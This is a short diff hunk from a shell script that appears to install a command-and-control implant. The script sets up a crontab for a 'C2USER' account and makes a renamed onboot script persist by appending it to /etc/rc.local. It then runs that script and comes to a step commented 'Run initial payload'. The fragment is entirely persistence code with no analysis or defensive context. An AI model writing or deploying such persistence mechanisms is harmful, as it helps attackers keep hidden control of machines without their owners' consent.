@@ -87,11 +87,12 @@ if [ $? == 1 ]; then
   $CHMOD 600 /var/spool/cron/crontabs/$C2USER
 fi
 
-$ECHO $LOKIHOME/onboot.sh >> /etc/rc.local
+$MV $LOKIHOME/onboot.sh $LOKIHOME/$MYNAME-onboot.sh
+$ECHO $LOKIHOME/$MYNAME-onboot.sh >> /etc/rc.local
 $CHMOD +x /etc/rc.local 
-$CHMOD +x $LOKIHOME/onboot.sh
+$CHMOD +x $LOKIHOME/$MYNAME-onboot.sh
 # We should have everything setup now.  
-$LOKIHOME/onboot.sh
+$LOKIHOME/$MYNAME-onboot.sh
 
 
 # Run initial payload
